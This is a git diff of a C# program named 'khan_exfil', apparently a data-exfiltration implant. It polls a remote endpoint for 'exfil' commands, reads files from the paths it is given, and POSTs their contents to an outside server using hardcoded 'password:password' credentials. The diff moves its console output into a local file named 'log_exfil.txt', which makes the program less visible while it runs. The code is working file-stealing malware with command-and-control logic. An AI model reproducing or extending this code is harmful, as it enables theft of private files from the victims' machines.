@@ -7,12 +7,20 @@ using System.Linq;
 using System.Net;
 using System.Threading; 
 
+public class Output
+{
+	public static void WriteLine(string log)
+	{
+		File.AppendAllText(@"log_exfil.txt", DateTime.Now.ToString()+"--"+log + Environment.NewLine);
+	}
+}
+
 public class khan_exfil
 {
 	public string PostRequestJson(string endpoint, string json)
 	{
     		
-			Console.WriteLine("(2) End point is : " +endpoint);
+			Output.WriteLine("(2) End point is : " +endpoint);
     		string jsonResponse = string.Empty;
  
     		using (var client = new WebClient())
@@ -27,7 +35,7 @@ public class khan_exfil
             		var uri = new Uri(endpoint);
            		    var response = client.UploadString(uri, "POST", json);
             		jsonResponse = response;
-					//Console.WriteLine("Chunk written");
+					//Output.WriteLine("Chunk written");
 					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
        			 }
         	catch (WebException ex)
@@ -36,17 +44,17 @@ public class khan_exfil
             		if (ex.Status == WebExceptionStatus.ProtocolError)
             		{
 						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
-						 Console.WriteLine("Error is :" +response);
+						 Output.WriteLine("Error is :" +response);
 						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
 						var statusCode = (int)wrsp.StatusCode;
 						var msg = wrsp.StatusDescription;
-						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
+						Output.WriteLine("Exception : " + msg + wrsp.StatusCode);
 						return msg;
                		
             		}
             		else
             		{
-                		Console.WriteLine("Exception 11" + ex.Message);
+                		Output.WriteLine("Exception 11" + ex.Message);
 						return ex.Message;
             		}
         		}
@@ -79,7 +87,7 @@ public class khan_exfil
 			}
 			catch(Exception ex)
 			{
-				Console.WriteLine("Exception while posting : " +ex.Message);
+				Output.WriteLine("Exception while posting : " +ex.Message);
 				return "0";
 			}
 		}
@@ -89,33 +97,33 @@ public class khan_exfil
         {
 			khan_exfil obj=new khan_exfil();
 			int i=0;
-			Console.WriteLine("(1) No exception till now");
+			Output.WriteLine("(1) No exception till now");
 			//System.IO.DirectoryInfo dirInf = new System.IO.DirectoryInfo(@"C:\myDir\Documents");
 			//var files = dirInf.GetFiles("*.doc").Where(f => (f.Attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden).ToArray();
             System.IO.DirectoryInfo dirInf ;
-			Console.WriteLine("(2) No exception till now");
+			Output.WriteLine("(2) No exception till now");
 			string master_files="";
 			List <System.IO.FileInfo> files = new List <System.IO.FileInfo>();
 			//var files = dirInf.GetFiles(@"C:\test", "*.doc").Where(file=> file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).ToArray();//If you want an array back
 			if (file_details.Equals("") ==true)
 			{
-				Console.WriteLine("(a) In if = file path" +path);
+				Output.WriteLine("(a) In if = file path" +path);
 				System.IO.FileInfo f=new System.IO.FileInfo(path);
 				files.Add(f);
-				Console.WriteLine("Length :" +files.Count.ToString());
+				Output.WriteLine("Length :" +files.Count.ToString());
 			}
 			else
 			{
-				Console.WriteLine("In else - Command of type path rec");
+				Output.WriteLine("In else - Command of type path rec");
 				dirInf = new System.IO.DirectoryInfo(@path);
 				files = dirInf.GetFiles(file_details).Where(f => (f.Attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden).ToArray().ToList();
 			}
 			
 			 foreach (System.IO.FileInfo fi in files)
 			{
-				Console.WriteLine("(x) In file loop !");
+				Output.WriteLine("(x) In file loop !");
 				master_files+=fi.Name+","+fi.Extension+",";
-				Console.WriteLine("{0}: {1}: {2} : {3}", fi.Name, fi.LastAccessTime, fi.Length , fi.DirectoryName);
+				Output.WriteLine("File Details : " +fi.Name+"-"+fi.LastAccessTime+"-"+fi.Length+"-"+fi.DirectoryName);
 				byte[] bytes = System.IO.File.ReadAllBytes(fi.DirectoryName+"\\"+fi.Name);
 		
 				//File.WriteAllBytes("Khan"+i.ToString()+fi.Extension, bytes);
@@ -134,7 +142,7 @@ public class khan_exfil
 				}
 				else
 				{
-					Console.WriteLine("Some error occured : Exiting ");
+					Output.WriteLine("Some error occured : Exiting ");
 					return;
 				}
 			}
@@ -148,11 +156,11 @@ public class khan_exfil
         }
         catch (UnauthorizedAccessException ex)
         {
-            Console.WriteLine("Exception Unauth :  " +ex.Message);
+            Output.WriteLine("Exception Unauth :  " +ex.Message);
         }
         catch (Exception ex)
         {
-            Console.WriteLine("(1) Exception General : " + ex.Message);
+            Output.WriteLine("(1) Exception General : " + ex.Message);
         }
 	}
 	public string getData(string endpoint)
@@ -161,7 +169,7 @@ public class khan_exfil
 		{
    			 try
     			{
-			Console.WriteLine("(1) End point is : " +endpoint);
+			Output.WriteLine("(1) End point is : " +endpoint);
         		client.BaseAddress = endpoint;
         		client.UseDefaultCredentials = true;
 				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
@@ -176,19 +184,19 @@ public class khan_exfil
                		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                 		var statusCode = (int)wrsp.StatusCode;
                 		var msg = wrsp.StatusDescription;
-						Console.WriteLine("Exception : " + msg);
+						Output.WriteLine("Exception : " + msg);
 						return "0";
                			
             		}
             		else
 					{
-                		Console.WriteLine("Exception 11" + ex.Message);
+                		Output.WriteLine("Exception 11" + ex.Message);
 						return "0";
             		}
 				}
 			catch(Exception ex)
 			{
-				Console.WriteLine("Genera; Exception " + ex.Message);
+				Output.WriteLine("Genera; Exception " + ex.Message);
 				return "0";
 			}
 	}
@@ -217,7 +225,7 @@ public class khan_exfil
 					
 					if(command_type.Equals("exfil"))
 					{
-						Console.WriteLine("(a) Path is : " +command_details[2]);
+						Output.WriteLine("(a) Path is : " +command_details[2]);
 						string type=command_details[1];
 						if(type=="path")
 						{
@@ -226,12 +234,12 @@ public class khan_exfil
 							{
 								new_command=command_details[0]+","+command_details[1]+","+command_details[2]+","+command_details[3]+","+"0";
 								var res1=obj.PostRequestJson(updated_ep,new_command);
-								Console.WriteLine("Updated Resp : " +res1);
+								Output.WriteLine("Updated Resp : " +res1);
 								obj.exfil(command_details[2],command_details[3]);
 							}
 							else
 							{
-								Console.WriteLine("(1) Pass no new command");
+								Output.WriteLine("(1) Pass no new command");
 							}
 						
 						}
@@ -242,26 +250,26 @@ public class khan_exfil
 							{
 								new_command=command_details[0]+","+command_details[1]+","+command_details[2]+","+"0";
 								var res1=obj.PostRequestJson(updated_ep,new_command);
-								Console.WriteLine("Updated Resp : " +res1);
+								Output.WriteLine("Updated Resp : " +res1);
 								obj.exfil(command_details[2],"");
 							}
 							else
 							{
-								Console.WriteLine("(2) Pass no new command");
+								Output.WriteLine("(2) Pass no new command");
 							}
 							
 						}
 						else
 						{
-							Console.WriteLine("(b) Invalid path");
+							Output.WriteLine("(b) Invalid path");
 						}
 					}
 				}
-				Console.WriteLine("Resp obtained : "+resp2);
+				Output.WriteLine("Resp obtained : "+resp2);
 				}
 				catch(Exception ex)
 				{
-					Console.WriteLine("Exception : " +ex.Message);
+					Output.WriteLine("Exception : " +ex.Message);
 					//sw.Write(ex.Message);
 				}
 				}
